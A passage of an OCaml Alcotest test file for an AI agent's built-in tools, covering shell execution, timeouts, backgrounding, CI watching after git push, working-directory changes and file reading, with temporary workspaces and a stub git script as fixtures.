        Process_group.signal_group job.pid Sys.sigkill;
        Lwt_main.run (Lwt_unix.sleep 0.05)
      end)

let test_shell_exec_interrupt_moves_to_background () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let interrupted = ref None in
      let pid_file = Filename.concat workspace "child.pid" in
      let command =
        Printf.sprintf "printf '%%s' \"$$\" > %s; echo hello; sleep 0.05"
          (Filename.quote pid_file)
      in
      let result =
        Lwt_main.run
          (let open Lwt.Syntax in
           let trigger =
             let rec wait_for_pid_file attempts =
               if Sys.file_exists pid_file || attempts <= 0 then Lwt.return_unit
               else
                 let* () = Lwt_unix.sleep 0.02 in
                 wait_for_pid_file (attempts - 1)
             in
             let* () = wait_for_pid_file 50 in
             interrupted := Some "stop now";
             Lwt.return_unit
           in
           let invoke =
             tool.Tool.invoke
               ~context:
                 {
                   Tool.session_key = Some "web:test";
                   send_progress = None;
                   interrupt_check = Some (fun () -> !interrupted);
                   inject_system_messages = None;
                   effective_cwd = None;
                   request_cwd_change = None;
                 }
               (`Assoc [ ("command", `String command) ])
           in
           let* result, () = Lwt.both invoke trigger in
           Lwt.return result)
      in
      Alcotest.(check bool)
        "result contains bg job info" true
        (contains result "Background shell job");
      Alcotest.(check bool)
        "result contains bg_shell_status hint" true
        (contains result "bg_shell_status");
      (* Extract job ID and wait for finish, then verify log *)
      let job_id =
        try
          let re = Str.regexp {|Background shell job #\([0-9]+\)|} in
          ignore (Str.search_forward re result 0);
          int_of_string (Str.matched_group 1 result)
        with _ -> Alcotest.fail "could not parse job ID"
      in
      let wait_tool = Tools_bg_shell.bg_shell_wait () in
      ignore
        (Lwt_main.run
           (wait_tool.Tool.invoke
              (`Assoc [ ("id", `Int job_id); ("timeout_seconds", `Float 5.0) ])));
      let job = Bg_shell.find job_id in
      (match job with
      | Some j ->
          let log = Bg_shell.read_log j () in
          Alcotest.(check bool) "log contains hello" true (contains log "hello")
      | None -> Alcotest.fail "bg_shell job not found");
      try Sys.remove pid_file with _ -> ())

let test_shell_exec_timeout_kills_descendants () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let pid_file = Filename.concat workspace "child-timeout.pid" in
      let command =
        Printf.sprintf
          "sleep 10 & child=$!; printf '%%s' \"$child\" > %s; wait $child"
          (Filename.quote pid_file)
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc [ ("command", `String command); ("timeout", `Float 0.2) ]))
      in
      let child_pid =
        let ic = open_in pid_file in
        Fun.protect
          (fun () -> int_of_string (input_line ic))
          ~finally:(fun () -> close_in ic)
      in
      let rec wait_until_gone attempts =
        if attempts <= 0 || not (process_exists child_pid) then ()
        else begin
          Unix.sleepf 0.05;
          wait_until_gone (attempts - 1)
        end
      in
      wait_until_gone 20;
      Alcotest.(check string)
        "timeout result" "Error: command timed out after 0 seconds" result;
      Alcotest.(check bool)
        "child process terminated after timeout" false
        (process_exists child_pid);
      Sys.remove pid_file)

let test_extract_cd_prefix () =
  let opt = Alcotest.option (Alcotest.pair Alcotest.string Alcotest.string) in
  Alcotest.(check opt)
    "simple cd && cmd"
    (Some ("/home/user/project", "make build"))
    (Tools_builtin.extract_cd_prefix "cd /home/user/project && make build");
  Alcotest.(check opt)
    "with extra spaces"
    (Some ("/tmp/dir", "ls -la"))
    (Tools_builtin.extract_cd_prefix "  cd   /tmp/dir   &&   ls -la  ");
  Alcotest.(check opt)
    "no cd prefix" None
    (Tools_builtin.extract_cd_prefix "make build");
  Alcotest.(check opt)
    "relative cd path returns None" None
    (Tools_builtin.extract_cd_prefix "cd relative/path && make build");
  Alcotest.(check opt)
    "empty rest returns None" None
    (Tools_builtin.extract_cd_prefix "cd /tmp &&");
  Alcotest.(check opt)
    "cd with opam exec"
    (Some
       ( "/home/xertrov/src/clawq.b132",
         "opam exec --switch=clawq-5.1 -- dune build" ))
    (Tools_builtin.extract_cd_prefix
       "cd /home/xertrov/src/clawq.b132 && opam exec --switch=clawq-5.1 -- \
        dune build");
  Alcotest.(check opt)
    "just cd no &&" None
    (Tools_builtin.extract_cd_prefix "cd /tmp")

let test_shell_exec_injects_session_id_env () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let context =
        {
          Tool.session_key = Some "telegram:42:testuser";
          send_progress = None;
          interrupt_check = None;
          inject_system_messages = None;
          effective_cwd = None;
          request_cwd_change = None;
        }
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke ~context
             (`Assoc [ ("command", `String "printenv CLAWQ_SESSION_ID") ]))
      in
      let contains s sub =
        let slen = String.length s and nlen = String.length sub in
        let rec loop i =
          if i + nlen > slen then false
          else if String.sub s i nlen = sub then true
          else loop (i + 1)
        in
        nlen = 0 || loop 0
      in
      Alcotest.(check bool)
        "output contains session id" true
        (contains result "telegram:42:testuser");
      Alcotest.(check bool) "exit code 0" true (contains result "exit_code: 0"))

let test_watch_ci_after_push_injects_failure_follow_up () =
  let mgr = Session.create ~config:Runtime_config.default () in
  let injected = ref [] in
  Session.set_special_command_handler mgr
    (fun ~key ~message ~send_progress:_ ~interrupt_check:_ ->
      injected := (key, message) :: !injected;
      Lwt.return_some Session.autonomous_stay_idle_message);
  let gh_command ?cwd:_ argv =
    match argv with
    | [ "run"; "list"; "--json"; _; "--limit"; "20" ] ->
        Lwt.return
          (Ok
             {|[
                  {
                    "databaseId": 17,
                    "headSha": "abc123",
                    "status": "completed",
                    "conclusion": "failure",
                    "url": "https://example.test/run/17",
                    "workflowName": "CI"
                  }
                ]|})
    | [ "run"; "view"; "17"; "--json"; _ ] ->
        Lwt.return
          (Ok
             {|{
                  "databaseId": 17,
                  "status": "completed",
                  "conclusion": "failure",
                  "url": "https://example.test/run/17",
                  "workflowName": "CI"
                }|})
    | _ -> Lwt.return (Error "unexpected gh invocation")
  in
  Lwt_main.run
    (Tools_builtin.watch_ci_after_push
       ~resolve_head_sha:(fun ~repo_path:_ -> Lwt.return (Ok "abc123\n"))
       ~gh_command
       ~sleep:(fun _ -> Lwt.return_unit)
       ~poll_interval:0.0 ~startup_timeout:0.0 ~completion_timeout:0.0
       ~session_mgr:mgr ~session_key:"telegram:42:testuser"
       ~repo_path:"/tmp/repo" ());
  Alcotest.(check int) "one async follow-up injected" 1 (List.length !injected);
  let key, message = List.hd !injected in
  Alcotest.(check string) "session key preserved" "telegram:42:testuser" key;
  Alcotest.(check bool)
    "message references async CI watch" true
    (contains message "[async CI watch]");
  Alcotest.(check bool)
    "message includes head sha" true
    (contains message "abc123");
  Alcotest.(check bool)
    "message includes run URL" true
    (contains message "https://example.test/run/17")

let test_inject_session_message_async_preserves_channel_context () =
  let mgr = Session.create ~config:Runtime_config.default () in
  let captured = ref None in
  let turn _mgr ~key ~message ?channel ?channel_id () =
    captured := Some (key, message, channel, channel_id);
    Lwt.return Session.queued_message_response
  in
  Lwt_main.run
    (Tools_builtin.inject_session_message_async ~turn_override:turn
       ~session_mgr:mgr ~session_key:"telegram:42:testuser" ~message:"hello" ());
  Alcotest.(
    check
      (option
         (pair (pair string string) (pair (option string) (option string)))))
    "inject uses channel routing from session key"
    (Some (("telegram:42:testuser", "hello"), (Some "telegram", Some "42")))
    (Option.map
       (fun (key, message, channel, channel_id) ->
         ((key, message), (channel, channel_id)))
       !captured)

let test_shell_exec_starts_ci_watch_asynchronously_after_push () =
  with_temp_workspace (fun workspace ->
      let real_git =
        read_process_output_or_fail ~label:"which git" "which git"
      in
      run_command_or_fail ~label:"git init"
        (Printf.sprintf "%s -C %s init -q" real_git (Filename.quote workspace));
      run_command_or_fail ~label:"git config user.email"
        (Printf.sprintf "%s -C %s config user.email test@example.com" real_git
           (Filename.quote workspace));
      run_command_or_fail ~label:"git config user.name"
        (Printf.sprintf "%s -C %s config user.name 'Test User'" real_git
           (Filename.quote workspace));
      let tracked = Filename.concat workspace "tracked.txt" in
      let tracked_oc = open_out tracked in
      output_string tracked_oc "base\n";
      close_out tracked_oc;
      run_command_or_fail ~label:"git add"
        (Printf.sprintf "%s -C %s add tracked.txt" real_git
           (Filename.quote workspace));
      run_command_or_fail ~label:"git commit"
        (Printf.sprintf "%s -C %s commit -q -m initial" real_git
           (Filename.quote workspace));
      let head_before =
        read_process_output_or_fail ~label:"git rev-parse HEAD"
          (Printf.sprintf "%s -C %s rev-parse HEAD" real_git
             (Filename.quote workspace))
      in
      let old_path = try Some (Sys.getenv "PATH") with Not_found -> None in
      let fake_git = Filename.concat workspace "git" in
      let oc = open_out fake_git in
      output_string oc
        (Printf.sprintf
           "#!/bin/sh\n\
            if [ \"$1\" = \"push\" ]; then\n\
           \  exit 0\n\
            fi\n\
            exec %s \"$@\"\n"
           (Filename.quote real_git));
      close_out oc;
      Unix.chmod fake_git 0o755;
      Unix.putenv "PATH"
        (workspace ^ match old_path with Some path -> ":" ^ path | None -> "");
      Fun.protect
        (fun () ->
          let sandbox =
            Sandbox.create ~backend:Sandbox.None ~workspace
              ~extra_allowed_paths:[] ~workspace_only:false ()
          in
          let mgr = Session.create ~config:Runtime_config.default () in
          let spawned = ref None in
          let watcher_started = ref false in
          let resolved_head = ref None in
          let tool =
            Tools_builtin.shell_exec_with_hooks ~workspace ~workspace_only:false
              ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
              ~session_mgr:mgr
              ~spawn_background:(fun promise -> spawned := Some promise)
              ~watch_ci_after_push:(fun
                  ?resolve_head_sha
                  ?gh_command:_
                  ?sleep:_
                  ?poll_interval:_
                  ?startup_timeout:_
                  ?completion_timeout:_
                  ~session_mgr:_
                  ~session_key:_
                  ~repo_path
                  ()
                ->
                let open Lwt.Syntax in
                let* () = Lwt.pause () in
                let* () =
                  match resolve_head_sha with
                  | Some resolve ->
                      let* head = resolve ~repo_path in
                      resolved_head := Some head;
                      Lwt.return_unit
                  | None ->
                      resolved_head := None;
                      Lwt.return_unit
                in
                watcher_started := true;
                Lwt.return_unit)
              ()
          in
          let context =
            {
              Tool.session_key = Some "telegram:42:testuser";
              send_progress = None;
              interrupt_check = None;
              inject_system_messages = None;
              effective_cwd = None;
              request_cwd_change = None;
            }
          in
          let result =
            Lwt_main.run
              (tool.Tool.invoke ~context
                 (`Assoc [ ("command", `String "git push") ]))
          in
          Alcotest.(check bool)
            "push command succeeded" true
            (contains result "exit_code: 0");
          Alcotest.(check bool)
            "watch not awaited inline" false !watcher_started;
          Alcotest.(check bool) "watch scheduled" true (Option.is_some !spawned);
          let tracked_oc = open_out tracked in
          output_string tracked_oc "changed\n";
          close_out tracked_oc;
          run_command_or_fail ~label:"git commit after push"
            (Printf.sprintf "%s -C %s commit -qam after-push" real_git
               (Filename.quote workspace));
          (match !spawned with
          | Some promise -> Lwt_main.run (promise ())
          | None -> Alcotest.fail "expected CI watch promise to be scheduled");
          Alcotest.(check (option (result string string)))
            "watch uses pre-push head after repo changes"
            (Some (Ok head_before)) !resolved_head;
          Alcotest.(check bool)
            "watch runs after shell result returns" true !watcher_started)
        ~finally:(fun () ->
          match old_path with
          | Some path -> Unix.putenv "PATH" path
          | None -> Unix.putenv "PATH" ""))

let test_shell_exec_cd_prefix_push_uses_cd_repo_path () =
  with_temp_workspace (fun workspace ->
      let repo = Filename.concat workspace "repo" in
      Unix.mkdir repo 0o755;
      let real_git =
        read_process_output_or_fail ~label:"which git" "which git"
      in
      let old_path = try Some (Sys.getenv "PATH") with Not_found -> None in
      let fake_git = Filename.concat workspace "git" in
      let oc = open_out fake_git in
      output_string oc
        (Printf.sprintf
           "#!/bin/sh\n\
            if [ \"$1\" = \"push\" ]; then\n\
           \  exit 0\n\
            fi\n\
            exec %s \"$@\"\n"
           (Filename.quote real_git));
      close_out oc;
      Unix.chmod fake_git 0o755;
      Unix.putenv "PATH"
        (workspace ^ match old_path with Some path -> ":" ^ path | None -> "");
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      Fun.protect
        (fun () ->
          let mgr = Session.create ~config:Runtime_config.default () in
          let captured_repo_path = ref None in
          let spawned = ref None in
          let tool =
            Tools_builtin.shell_exec_with_hooks ~workspace ~workspace_only:false
              ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
              ~session_mgr:mgr
              ~spawn_background:(fun promise -> spawned := Some promise)
              ~watch_ci_after_push:(fun
                  ?resolve_head_sha:_
                  ?gh_command:_
                  ?sleep:_
                  ?poll_interval:_
                  ?startup_timeout:_
                  ?completion_timeout:_
                  ~session_mgr:_
                  ~session_key:_
                  ~repo_path
                  ()
                ->
                captured_repo_path := Some repo_path;
                Lwt.return_unit)
              ()
          in
          let context =
            {
              Tool.session_key = Some "telegram:42:testuser";
              send_progress = None;
              interrupt_check = None;
              inject_system_messages = None;
              effective_cwd = None;
              request_cwd_change = None;
            }
          in
          let command = Printf.sprintf "cd %s && git push" repo in
          let result =
            Lwt_main.run
              (tool.Tool.invoke ~context
                 (`Assoc [ ("command", `String command) ]))
          in
          Alcotest.(check bool)
            "push command succeeded" true
            (contains result "exit_code: 0");
          (match !spawned with
          | Some promise -> Lwt_main.run (promise ())
          | None -> Alcotest.fail "expected CI watch promise to be scheduled");
          Alcotest.(check (option string))
            "watch uses cd repo path" (Some repo) !captured_repo_path)
        ~finally:(fun () ->
          match old_path with
          | Some path -> Unix.putenv "PATH" path
          | None -> Unix.putenv "PATH" ""))

let test_shell_exec_cd_prefix_optimization () =
  with_temp_workspace (fun workspace ->
      let subdir = Filename.concat workspace "subdir" in
      Unix.mkdir subdir 0o755;
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let command = Printf.sprintf "cd %s && pwd" subdir in
      let result =
        Lwt_main.run
          (tool.Tool.invoke (`Assoc [ ("command", `String command) ]))
      in
      let has_substr s sub =
        let slen = String.length s and nlen = String.length sub in
        let rec loop i =
          if i + nlen > slen then false
          else if String.sub s i nlen = sub then true
          else loop (i + 1)
        in
        nlen = 0 || loop 0
      in
      Alcotest.(check bool)
        "output contains subdir path" true (has_substr result subdir);
      Alcotest.(check bool)
        "exit code 0" true
        (has_substr result "exit_code: 0"))

let test_git_operations_repo_path_relative_rejected () =
  with_temp_workspace (fun workspace ->
      let tool = Tools_builtin.git_operations ~workspace in
      let result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("operation", `String "status");
                  ("repo_path", `String "relative/path");
                ]))
      in
      Alcotest.(check bool)
        "relative repo_path returns error" true (contains result "Error:"))

let test_git_operations_repo_path_absolute_used_as_cwd () =
  with_temp_workspace (fun workspace ->
      let repo = Filename.concat workspace "repo" in
      Unix.mkdir repo 0o755;
      let real_git =
        read_process_output_or_fail ~label:"which git" "which git"
      in
      run_command_or_fail ~label:"git init"
        (Printf.sprintf "%s -C %s init -q" real_git (Filename.quote repo));
      run_command_or_fail ~label:"git config user.email"
        (Printf.sprintf "%s -C %s config user.email test@example.com" real_git
           (Filename.quote repo));
      run_command_or_fail ~label:"git config user.name"
        (Printf.sprintf "%s -C %s config user.name 'Test User'" real_git
           (Filename.quote repo));
      let tool = Tools_builtin.git_operations ~workspace in
      let result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [ ("operation", `String "status"); ("repo_path", `String repo) ]))
      in
      Alcotest.(check bool)
        "status in explicit repo succeeds (no fatal error)" true
        (not (contains result "fatal:")))

let make_test_config ~workspace ~allowed_cwd_patterns =
  {
    Runtime_config.default with
    workspace;
    security =
      {
        Runtime_config.default.security with
        workspace_only = false;
        allowed_cwd_patterns;
      };
  }

let with_temp_dir_tree f =
  let root = Filename.temp_file "clawq_cwd_test" "" in
  Sys.remove root;
  Unix.mkdir root 0o755;
  let sub = Filename.concat root "subdir" in
  Unix.mkdir sub 0o755;
  let file = Filename.concat root "testfile.txt" in
  let oc = open_out file in
  output_string oc "hello world\n";
  close_out oc;
  let sub_file = Filename.concat sub "nested.txt" in
  let oc = open_out sub_file in
  output_string oc "nested content\n";
  close_out oc;
  Fun.protect
    (fun () -> f ~root ~sub ~file ~sub_file)
    ~finally:(fun () ->
      (try Sys.remove sub_file with _ -> ());
      (try Sys.remove file with _ -> ());
      (try Unix.rmdir sub with _ -> ());
      try Unix.rmdir root with _ -> ())

let test_change_working_dir_basic () =
  with_temp_dir_tree (fun ~root ~sub ~file:_ ~sub_file:_ ->
      let config =
        make_test_config ~workspace:root ~allowed_cwd_patterns:[ root ^ "/**" ]
      in
      let tool =
        Tools_builtin.change_working_dir ~config ~workspace:root
          ~workspace_only:false ~extra_allowed_paths:[]
      in
      let cwd_changed_to = ref None in
      let context =
        {
          Tool.session_key = None;
          send_progress = None;
          interrupt_check = None;
          inject_system_messages = None;
          effective_cwd = None;
          request_cwd_change =
            Some (fun path _wipe -> cwd_changed_to := Some path);
        }
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke ~context (`Assoc [ ("path", `String "subdir") ]))
      in
      Alcotest.(check bool) "result contains new CWD" true (contains result sub);
      Alcotest.(check (option string))
        "callback received new CWD" (Some sub) !cwd_changed_to)

let test_change_working_dir_rejects_unmatched_pattern () =
  with_temp_dir_tree (fun ~root ~sub:_ ~file:_ ~sub_file:_ ->
      let config =
        make_test_config ~workspace:root
          ~allowed_cwd_patterns:[ "/nonexistent/pattern/**" ]
      in
      let tool =
        Tools_builtin.change_working_dir ~config ~workspace:root
          ~workspace_only:false ~extra_allowed_paths:[]
      in
      let context =
        {
          Tool.session_key = None;
          send_progress = None;
          interrupt_check = None;
          inject_system_messages = None;
          effective_cwd = None;
          request_cwd_change = Some (fun _ _ -> ());
        }
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke ~context (`Assoc [ ("path", `String "subdir") ]))
      in
      Alcotest.(check bool)
        "error mentions allowed_cwd_patterns" true
        (contains result "allowed_cwd_patterns"))

let test_change_working_dir_allows_matching_pattern () =
  with_temp_dir_tree (fun ~root ~sub ~file:_ ~sub_file:_ ->
      let config =
        make_test_config ~workspace:root ~allowed_cwd_patterns:[ root ^ "/**" ]
      in
      let tool =
        Tools_builtin.change_working_dir ~config ~workspace:root
          ~workspace_only:false ~extra_allowed_paths:[]
      in
      let cwd_changed = ref false in
      let context =
        {
          Tool.session_key = None;
          send_progress = None;
          interrupt_check = None;
          inject_system_messages = None;
          effective_cwd = None;
          request_cwd_change = Some (fun _ _ -> cwd_changed := true);
        }
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke ~context (`Assoc [ ("path", `String sub) ]))
      in
      Alcotest.(check bool)
        "result not an error" true
        (not (String.starts_with ~prefix:"Error:" result));
      Alcotest.(check bool) "callback fired" true !cwd_changed)

let test_change_working_dir_rejects_nonexistent () =
  with_temp_dir_tree (fun ~root ~sub:_ ~file:_ ~sub_file:_ ->
      let config =
        make_test_config ~workspace:root ~allowed_cwd_patterns:[ root ^ "/**" ]
      in
      let tool =
        Tools_builtin.change_working_dir ~config ~workspace:root
          ~workspace_only:false ~extra_allowed_paths:[]
      in
      let context =
        {
          Tool.session_key = None;
          send_progress = None;
          interrupt_check = None;
          inject_system_messages = None;
          effective_cwd = None;
          request_cwd_change = Some (fun _ _ -> ());
        }
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke ~context
             (`Assoc [ ("path", `String "does_not_exist") ]))
      in
      Alcotest.(check bool)
        "error for non-existent" true
        (contains result "does not exist"))

let test_change_working_dir_rejects_file () =
  with_temp_dir_tree (fun ~root ~sub:_ ~file ~sub_file:_ ->
      let config =
        make_test_config ~workspace:root ~allowed_cwd_patterns:[ root ^ "/**" ]
      in
      let tool =
        Tools_builtin.change_working_dir ~config ~workspace:root
          ~workspace_only:false ~extra_allowed_paths:[]
      in
      let context =
        {
          Tool.session_key = None;
          send_progress = None;
          interrupt_check = None;
          inject_system_messages = None;
          effective_cwd = None;
          request_cwd_change = Some (fun _ _ -> ());
        }
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke ~context (`Assoc [ ("path", `String file) ]))
      in
      Alcotest.(check bool)
        "error for file target" true
        (contains result "not a directory"))

let test_change_working_dir_wipe_history () =
  with_temp_dir_tree (fun ~root ~sub:_ ~file:_ ~sub_file:_ ->
      let config =
        make_test_config ~workspace:root ~allowed_cwd_patterns:[ root ^ "/**" ]
      in
      let agent = Agent.create ~config () in
      agent.history <-
        [
          Provider.make_message ~role:"tool" ~content:"some result";
          Provider.make_message ~role:"assistant" ~content:"";
          Provider.make_message ~role:"user" ~content:"first user message";
        ];
      Alcotest.(check int) "history has 3 msgs" 3 (List.length agent.history);
      agent.effective_cwd <- Some (Filename.concat root "subdir");
      Agent.perform_cwd_history_wipe agent;
      Alcotest.(check int)
        "history has 2 msgs after wipe" 2
        (List.length agent.history);
      let first = List.nth (List.rev agent.history) 0 in
      Alcotest.(check string) "first msg is user" "user" first.Provider.role;
      Alcotest.(check string)
        "first msg content preserved" "first user message" first.content)

let test_file_read_uses_effective_cwd () =
  with_temp_dir_tree (fun ~root ~sub ~file:_ ~sub_file:_ ->
      let tool =
        Tools_builtin.file_read ~workspace:root ~workspace_only:false
          ~extra_allowed_paths:[]
      in
      let context =
        {
          Tool.session_key = None;
          send_progress = None;
          interrupt_check = None;
          inject_system_messages = None;
          effective_cwd = Some sub;
          request_cwd_change = None;
        }
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke ~context
             (`Assoc [ ("path", `String "nested.txt") ]))
      in
      Alcotest.(check bool)
        "reads from effective CWD" true
        (contains result "nested content"))

let test_file_read_on_directory () =
  with_temp_dir_tree (fun ~root ~sub:_ ~file:_ ~sub_file:_ ->
      let tool =
        Tools_builtin.file_read ~workspace:root ~workspace_only:false
          ~extra_allowed_paths:[]
      in
      let result =
        Lwt_main.run (tool.Tool.invoke (`Assoc [ ("path", `String root) ]))
      in
      Alcotest.(check bool)
        "mentions directory" true
        (contains result "is a directory");
      Alcotest.(check bool)
        "suggests list_dir with path" true
        (contains result "list_dir(path=");
      Alcotest.(check bool) "includes listing" true (contains result "subdir"))

let test_shell_exec_uses_effective_cwd () =
  with_temp_dir_tree (fun ~root ~sub ~file:_ ~sub_file:_ ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace:root
          ~extra_allowed_paths:[] ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace:root ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let context =
        {
          Tool.session_key = None;
          send_progress = None;
          interrupt_check = None;
          inject_system_messages = None;
          effective_cwd = Some sub;
          request_cwd_change = None;
        }
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke ~context (`Assoc [ ("command", `String "pwd") ]))
      in
      Alcotest.(check bool)
        "pwd matches effective CWD" true (contains result sub))

let test_list_dir_uses_effective_cwd () =
  with_temp_dir_tree (fun ~root ~sub ~file:_ ~sub_file:_ ->
      let tool =
        Tools_builtin.list_dir ~workspace:root ~workspace_only:false
          ~extra_allowed_paths:[]
      in
      let context =
        {
          Tool.session_key = None;
          send_progress = None;
          interrupt_check = None;
          inject_system_messages = None;
          effective_cwd = Some sub;
          request_cwd_change = None;
        }
      in
      let result = Lwt_main.run (tool.Tool.invoke ~context (`Assoc [])) in
      Alcotest.(check bool)
        "lists effective CWD contents" true
        (contains result "nested.txt"))

(* B604: every tool must declare a "required" array in its JSON schema (even
   if empty) so the Anthropic Messages API (and other strict format providers)
   don't reject the schema. *)
let test_every_builtin_tool_has_required_field () =
  let registry = Tool_registry.create () in
  let config = Runtime_config.default in
  let sandbox =
    Sandbox.create ~backend:Sandbox.None
      ~workspace:(Runtime_config.effective_workspace config)
      ~extra_allowed_paths:[] ~workspace_only:false ()
  in
  Tools_builtin.register_all ~config ~sandbox registry;
  let tools = Tool_registry.list registry in
  List.iter
    (fun (t : Tool.t) ->
      let has_required =
        match t.parameters_schema with
        | `Assoc fields -> List.mem_assoc "required" fields
        | _ -> false
      in
      Alcotest.(check bool)
        (Printf.sprintf
           "tool %s has 'required' field in parameters_schema (B604)" t.name)
        true has_required)
    tools

let suite =
  [
    Alcotest.test_case "normalize absolute" `Quick test_normalize_absolute;
    Alcotest.test_case "normalize dot" `Quick test_normalize_dot;
    Alcotest.test_case "normalize dotdot" `Quick test_normalize_dotdot;
    Alcotest.test_case "normalize relative" `Quick test_normalize_relative;
    Alcotest.test_case "normalize empty segments" `Quick
      test_normalize_empty_segments;
    Alcotest.test_case "normalize trailing slash" `Quick
      test_normalize_trailing_slash;
    Alcotest.test_case "normalize root" `Quick test_normalize_root;
    Alcotest.test_case "path safe inside workspace" `Quick
      test_path_safe_inside_workspace;
    Alcotest.test_case "path safe workspace root" `Quick
      test_path_safe_workspace_root;
    Alcotest.test_case "path safe outside workspace" `Quick
      test_path_safe_outside_workspace;
    Alcotest.test_case "path safe dotdot escape" `Quick
      test_path_safe_dotdot_escape;
    Alcotest.test_case "path safe sibling dir" `Quick test_path_safe_sibling_dir;
    Alcotest.test_case "path safe nested" `Quick test_path_safe_nested;
    Alcotest.test_case "path safe prefix trick" `Quick
      test_path_safe_prefix_trick;
    Alcotest.test_case "command allowed in list" `Quick
      test_command_allowed_in_list;
    Alcotest.test_case "command not in list" `Quick test_command_not_in_list;
    Alcotest.test_case "command empty string" `Quick test_command_empty_string;
    Alcotest.test_case "command with path prefix" `Quick
      test_command_with_path_prefix;
    Alcotest.test_case "command with args" `Quick test_command_with_args;
    Alcotest.test_case "command env var prefix" `Quick
      test_command_env_var_prefix;
    Alcotest.test_case "default allowlist includes basics" `Quick
      test_command_default_allowlist_includes_basics;
    Alcotest.test_case "web_search reads live config after registry refresh"
      `Quick test_web_search_reads_live_config_after_registry_refresh;
    Alcotest.test_case "registry remove drops tool" `Quick
      test_registry_remove_drops_tool;
    Alcotest.test_case "zai websearch requires api key" `Quick
      test_zai_websearch_requires_api_key;
    Alcotest.test_case "zai websearch success invokes mcp" `Quick
      test_zai_websearch_success_invokes_mcp;
    Alcotest.test_case "zai webfetch success invokes mcp" `Quick
      test_zai_webfetch_success_invokes_mcp;
    Alcotest.test_case "zai websearch negative paths" `Quick
      test_zai_websearch_negative_paths;
    Alcotest.test_case "zai webfetch negative paths" `Quick
      test_zai_webfetch_negative_paths;
    Alcotest.test_case "zai websearch discovery failure falls back" `Quick
      test_zai_websearch_discovery_failure_falls_back;
    Alcotest.test_case "zai websearch cache hit" `Quick
      test_zai_websearch_cache_hit;
    Alcotest.test_case "zai websearch integration" `Slow
      test_zai_websearch_integration;
    Alcotest.test_case "zai webfetch integration" `Slow
      test_zai_webfetch_integration;
    Alcotest.test_case "register builtin tools includes enabled zai tools"
      `Quick test_register_builtin_tools_includes_enabled_zai_tools;
    Alcotest.test_case "refresh replaces config-bound tools" `Quick
      test_refresh_replaces_config_bound_tools;
    Alcotest.test_case "safe command no special chars" `Quick
      test_safe_command_no_special;
    Alcotest.test_case "unsafe semicolon" `Quick test_unsafe_semicolon;
    Alcotest.test_case "unsafe pipe" `Quick test_unsafe_pipe;
    Alcotest.test_case "unsafe redirect" `Quick test_unsafe_redirect;
    Alcotest.test_case "unsafe dollar paren" `Quick test_unsafe_dollar_paren;
    Alcotest.test_case "unsafe backtick" `Quick test_unsafe_backtick;
    Alcotest.test_case "unsafe ampersand" `Quick test_unsafe_ampersand;
    Alcotest.test_case "extract command simple" `Quick
      test_extract_command_simple;
    Alcotest.test_case "extract command with path" `Quick
      test_extract_command_with_path;
    Alcotest.test_case "extract command env prefix" `Quick
      test_extract_command_env_prefix;
    Alcotest.test_case "extract command empty" `Quick test_extract_command_empty;
    Alcotest.test_case "extract command only env" `Quick
      test_extract_command_only_env;
    Alcotest.test_case "path safe dot in path" `Quick
      test_path_safe_symlink_like;
    Alcotest.test_case "path safe symlink resolves inside workspace" `Quick
      test_path_safe_symlink_resolves_inside_workspace;
    Alcotest.test_case "unsafe double ampersand" `Quick
      test_unsafe_double_ampersand;
    Alcotest.test_case "safe command with flags" `Quick
      test_safe_single_command_with_flags;
    Alcotest.test_case "path safety random conformance" `Quick
      test_path_safety_random_conformance;
    Alcotest.test_case "shell safety random conformance" `Quick
      test_shell_safety_random_conformance;
    Alcotest.test_case "send_message uses send_fn over send_progress" `Quick
      test_send_message_uses_send_fn_over_send_progress;
    Alcotest.test_case "send_message falls back to notify channel" `Quick
      test_send_message_falls_back_to_notify_channel;
    Alcotest.test_case "send_message errors without notifier" `Quick
      test_send_message_errors_without_any_notifier;
    Alcotest.test_case "send_message with buttons via rich notifier" `Quick
      test_send_message_with_buttons_rich_notifier;
    Alcotest.test_case "send_message with buttons text fallback" `Quick
      test_send_message_with_buttons_text_fallback;
    Alcotest.test_case "send_message plain text via rich notifier" `Quick
      test_send_message_plain_text_via_rich_notifier;
    Alcotest.test_case "send_message plain text rich fallback no session" `Quick
      test_send_message_plain_text_rich_fallback_no_session;
    Alcotest.test_case "send_poll with rich notifier" `Quick
      test_send_poll_rich_notifier;
